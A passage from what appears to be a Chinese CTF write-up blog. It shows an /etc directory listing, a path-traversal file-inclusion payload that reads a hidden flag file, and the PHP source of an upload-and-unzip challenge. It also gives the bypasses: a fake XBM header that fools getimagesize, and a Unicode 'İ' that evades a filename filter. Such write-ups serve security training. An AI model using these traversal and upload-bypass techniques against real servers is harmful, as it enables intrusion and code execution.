threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>



<p>得到etc目录下所有文件和目录，发现fecccibbdc目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">[0]&#x3D;&gt;                                 </span><br><span class="line">string(1) &quot;.&quot;                         </span><br><span class="line">[1]&#x3D;&gt;                                 </span><br><span class="line">string(2) &quot;..&quot;                        </span><br><span class="line">[2]&#x3D;&gt;                                 </span><br><span class="line">string(9) &quot;.pwd.lock&quot;                 </span><br><span class="line">[3]&#x3D;&gt;                                 </span><br><span class="line">string(3) &quot;X11&quot;                       </span><br><span class="line">[4]&#x3D;&gt;                                 </span><br><span class="line">string(12) &quot;adduser.conf&quot;             </span><br><span class="line">[5]&#x3D;&gt;                                 </span><br><span class="line">string(12) &quot;alternatives&quot;             </span><br><span class="line">[6]&#x3D;&gt;                                 </span><br><span class="line">string(7) &quot;apache2&quot;                   </span><br><span class="line">[7]&#x3D;&gt;                                 </span><br><span class="line">string(10) &quot;apparmor.d&quot;               </span><br><span class="line">[8]&#x3D;&gt;                                 </span><br><span class="line">string(3) &quot;apt&quot;                       </span><br><span class="line">[9]&#x3D;&gt;                                 </span><br><span class="line">string(11) &quot;bash.bashrc&quot;              </span><br><span class="line">[10]&#x3D;&gt;                                </span><br><span class="line">string(17) &quot;bash_completion.d&quot;        </span><br><span class="line">[11]&#x3D;&gt;                                </span><br><span class="line">string(22) &quot;bindresvport.blacklist&quot;   </span><br><span class="line">[12]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;binfmt.d&quot;                  </span><br><span class="line">[13]&#x3D;&gt;                                </span><br><span class="line">string(15) &quot;ca-certificates&quot;          </span><br><span class="line">[14]&#x3D;&gt;                                </span><br><span class="line">string(20) &quot;ca-certificates.conf&quot;     </span><br><span class="line">[15]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;cron.d&quot;                    </span><br><span class="line">[16]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;cron.daily&quot;               </span><br><span class="line">[17]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;cron.weekly&quot;              </span><br><span class="line">[18]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;dbus-1&quot;                    </span><br><span class="line">[19]&#x3D;&gt;                                </span><br><span class="line">string(12) &quot;debconf.conf&quot;             </span><br><span class="line">[20]&#x3D;&gt;                                </span><br><span class="line">string(14) &quot;debian_version&quot;           </span><br><span class="line">[21]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;default&quot;                   </span><br><span class="line">[22]&#x3D;&gt;                                </span><br><span class="line">string(12) &quot;deluser.conf&quot;             </span><br><span class="line">[23]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;dhcp&quot;                      </span><br><span class="line">[24]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;dpkg&quot;                      </span><br><span class="line">[25]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;environment&quot;              </span><br><span class="line">[26]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;fecccibbdc&quot;               </span><br><span class="line">[27]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;fstab&quot;                     </span><br><span class="line">[28]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;gai.conf&quot;                  </span><br><span class="line">[29]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;group&quot;                     </span><br><span class="line">[30]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;group-&quot;                    </span><br><span class="line">[31]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;gshadow&quot;                   </span><br><span class="line">[32]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;gshadow-&quot;                  </span><br><span class="line">[33]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;host.conf&quot;                 </span><br><span class="line">[34]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;hostname&quot;                  </span><br><span class="line">[35]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;hosts&quot;                     </span><br><span class="line">[36]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;init&quot;                      </span><br><span class="line">[37]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;init.d&quot;                    </span><br><span class="line">[38]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;inputrc&quot;                   </span><br><span class="line">[39]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;insserv&quot;                   </span><br><span class="line">[40]&#x3D;&gt;                                </span><br><span class="line">string(12) &quot;insserv.conf&quot;             </span><br><span class="line">[41]&#x3D;&gt;                                </span><br><span class="line">string(14) &quot;insserv.conf.d&quot;           </span><br><span class="line">[42]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;issue&quot;                     </span><br><span class="line">[43]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;issue.net&quot;                 </span><br><span class="line">[44]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;kernel&quot;                    </span><br><span class="line">[45]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;ld.so.cache&quot;              </span><br><span class="line">[46]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;ld.so.conf&quot;               </span><br><span class="line">[47]&#x3D;&gt;                                </span><br><span class="line">string(12) &quot;ld.so.conf.d&quot;             </span><br><span class="line">[48]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;ldap&quot;                      </span><br><span class="line">[49]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;legal&quot;                     </span><br><span class="line">[50]&#x3D;&gt;                                </span><br><span class="line">string(13) &quot;libaudit.conf&quot;            </span><br><span class="line">[51]&#x3D;&gt;                                </span><br><span class="line">string(12) &quot;locale.alias&quot;             </span><br><span class="line">[52]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;locale.gen&quot;               </span><br><span class="line">[53]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;localtime&quot;                 </span><br><span class="line">[54]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;logcheck&quot;                  </span><br><span class="line">[55]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;login.defs&quot;               </span><br><span class="line">[56]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;logrotate.d&quot;              </span><br><span class="line">[57]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;lsb-release&quot;              </span><br><span class="line">[58]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;machine-id&quot;               </span><br><span class="line">[59]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;magic&quot;                     </span><br><span class="line">[60]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;magic.mime&quot;               </span><br><span class="line">[61]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;mailcap&quot;                   </span><br><span class="line">[62]&#x3D;&gt;                                </span><br><span class="line">string(13) &quot;mailcap.order&quot;            </span><br><span class="line">[63]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;mime.types&quot;               </span><br><span class="line">[64]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;mke2fs.conf&quot;              </span><br><span class="line">[65]&#x3D;&gt;                                </span><br><span class="line">string(14) &quot;modules-load.d&quot;           </span><br><span class="line">[66]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;mtab&quot;                      </span><br><span class="line">[67]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;mysql&quot;                     </span><br><span class="line">[68]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;networks&quot;                  </span><br><span class="line">[69]&#x3D;&gt;                                </span><br><span class="line">string(13) &quot;nsswitch.conf&quot;            </span><br><span class="line">[70]&#x3D;&gt;                                </span><br><span class="line">string(3) &quot;opt&quot;                       </span><br><span class="line">[71]&#x3D;&gt;                                </span><br><span class="line">string(10) &quot;os-release&quot;               </span><br><span class="line">[72]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;pam.conf&quot;                  </span><br><span class="line">[73]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;pam.d&quot;                     </span><br><span class="line">[74]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;passwd&quot;                    </span><br><span class="line">[75]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;passwd-&quot;                   </span><br><span class="line">[76]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;perl&quot;                      </span><br><span class="line">[77]&#x3D;&gt;                                </span><br><span class="line">string(3) &quot;php&quot;                       </span><br><span class="line">[78]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;profile&quot;                   </span><br><span class="line">[79]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;profile.d&quot;                 </span><br><span class="line">[80]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;python3.8&quot;                 </span><br><span class="line">[81]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;rc.local&quot;                  </span><br><span class="line">[82]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc0.d&quot;                     </span><br><span class="line">[83]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc1.d&quot;                     </span><br><span class="line">[84]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc2.d&quot;                     </span><br><span class="line">[85]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc3.d&quot;                     </span><br><span class="line">[86]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc4.d&quot;                     </span><br><span class="line">[87]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc5.d&quot;                     </span><br><span class="line">[88]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rc6.d&quot;                     </span><br><span class="line">[89]&#x3D;&gt;                                </span><br><span class="line">string(5) &quot;rcS.d&quot;                     </span><br><span class="line">[90]&#x3D;&gt;                                </span><br><span class="line">string(11) &quot;resolv.conf&quot;              </span><br><span class="line">[91]&#x3D;&gt;                                </span><br><span class="line">string(3) &quot;rmt&quot;                       </span><br><span class="line">[92]&#x3D;&gt;                                </span><br><span class="line">string(9) &quot;securetty&quot;                 </span><br><span class="line">[93]&#x3D;&gt;                                </span><br><span class="line">string(8) &quot;security&quot;                  </span><br><span class="line">[94]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;selinux&quot;                   </span><br><span class="line">[95]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;shadow&quot;                    </span><br><span class="line">[96]&#x3D;&gt;                                </span><br><span class="line">string(7) &quot;shadow-&quot;                   </span><br><span class="line">[97]&#x3D;&gt;                                </span><br><span class="line">string(6) &quot;shells&quot;                    </span><br><span class="line">[98]&#x3D;&gt;                                </span><br><span class="line">string(4) &quot;skel&quot;                      </span><br><span class="line">[99]&#x3D;&gt;                                </span><br><span class="line">string(3) &quot;ssl&quot;                       </span><br><span class="line">[100]&#x3D;&gt;                               </span><br><span class="line">string(6) &quot;subgid&quot;                    </span><br><span class="line">[101]&#x3D;&gt;                               </span><br><span class="line">string(7) &quot;subgid-&quot;                   </span><br><span class="line">[102]&#x3D;&gt;                               </span><br><span class="line">string(6) &quot;subuid&quot;                    </span><br><span class="line">[103]&#x3D;&gt;                               </span><br><span class="line">string(7) &quot;subuid-&quot;                   </span><br><span class="line">[104]&#x3D;&gt;                               </span><br><span class="line">string(11) &quot;sysctl.conf&quot;              </span><br><span class="line">[105]&#x3D;&gt;                               </span><br><span class="line">string(8) &quot;sysctl.d&quot;                  </span><br><span class="line">[106]&#x3D;&gt;                               </span><br><span class="line">string(7) &quot;systemd&quot;                   </span><br><span class="line">[107]&#x3D;&gt;                               </span><br><span class="line">string(8) &quot;terminfo&quot;                  </span><br><span class="line">[108]&#x3D;&gt;                               </span><br><span class="line">string(8) &quot;timezone&quot;                  </span><br><span class="line">[109]&#x3D;&gt;                               </span><br><span class="line">string(10) &quot;tmpfiles.d&quot;               </span><br><span class="line">[110]&#x3D;&gt;                               </span><br><span class="line">string(8) &quot;ucf.conf&quot;                  </span><br><span class="line">[111]&#x3D;&gt;                               </span><br><span class="line">string(4) &quot;udev&quot;                      </span><br><span class="line">[112]&#x3D;&gt;                               </span><br><span class="line">string(3) &quot;ufw&quot;                       </span><br><span class="line">[113]&#x3D;&gt;                               </span><br><span class="line">string(13) &quot;update-motd.d&quot;            </span><br><span class="line">[114]&#x3D;&gt;                               </span><br><span class="line">string(3) &quot;vim&quot;                       </span><br><span class="line">[115]&#x3D;&gt;                               </span><br><span class="line">string(6) &quot;wgetrc&quot;                    </span><br><span class="line">[116]&#x3D;&gt;                               </span><br><span class="line">string(3) &quot;xdg&quot;                       </span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60a35a860878a.jpg"></p>
<p>按照顺序遍历目录，得到flag路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;fecccibbdc&#x2F;bdaaaaedef&#x2F;fcjgecchaa&#x2F;idchbadaha&#x2F;ehdchcjedh&#x2F;fl444444g</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60a35a85f3221.jpg"></p>
<p>包含文件得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cf&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;fecccibbdc&#x2F;bdaaaaedef&#x2F;fcjgecchaa&#x2F;idchbadaha&#x2F;ehdchcjedh&#x2F;fl444444g</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60a35a84d0a79.jpg"></p>
<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>最后一波试卷的题目，比赛的时候没做出来，在buu上进行复现</p>
<p>有两个页面：index.php和example.php</p>
<p>index.php：上传文件</p>
<p>example.php：解压文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这么大个的东西你是想d我吗？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span>[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;东西不能方方正正的话就很讨厌&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fileName</span>=urldecode(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$fileName</span>,<span class="string">&quot;c&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;i&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;h&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;有些东西让你传上去的话那可不得了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imagePath</span> = <span class="string">&quot;/var/www/html/image/&quot;</span> . mb_strtolower(<span class="variable">$fileName</span>);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$imagePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;传都没有传上去&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>解压文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//example.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    <span class="variable">$name_for_zip</span> = <span class="string">&quot;example/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>)[count(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>))<span class="number">-1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;要不咱们再看看？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$name_for_zip</span>) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;都不能解压呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;可以解压，我想想存哪里&quot;</span>;</span><br><span class="line">    <span class="variable">$pos_for_zip</span> = <span class="string">&quot;/tmp/example/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$pos_for_zip</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">    unlink(<span class="variable">$name_for_zip</span>);</span><br><span class="line">    <span class="variable">$files</span> = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">        <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$final_name</span> = pathinfo(<span class="variable">$file</span>)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng(<span class="variable">$second</span>, <span class="string">&#x27;example/&#x27;</span>.<span class="variable">$final_name</span>);</span><br><span class="line">            imagedestroy(<span class="variable">$second</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以先在index.php上传一个包含php文件的zip文件，然后在example.php中解压</p>
<p>需要绕过两处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.getImagesize 长度和宽度stristr过滤</span><br></pre></td></tr></table></figure>



<p><strong>绕过getimagesize</strong></p>
<p>getimagesize返回数组的索引 0，1分别是宽度和高度，也就是上传图片的宽度和高度必须都为1。绕过方法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define width 1#define height 1</span><br></pre></td></tr></table></figure>



<p><strong>利用unicode字符绕过stristr</strong></p>
<p>直接上传zip文件，i会被过滤，由于使用了<code>mb_strtolower</code>处理文件名，因此可以使用unicode字符绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>var_dump(mb_strtolower(<span class="string">&#x27;İ&#x27;</span>)===<span class="string">&#x27;i&#x27;</span>);<span class="keyword">echo</span> urlencode(<span class="string">&quot;İ&quot;</span>); <span class="comment">//%C4%B0<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到两者相等</p>
<p><img src="https://www.hualigs.cn/image/60a35a839549a.jpg"></p>
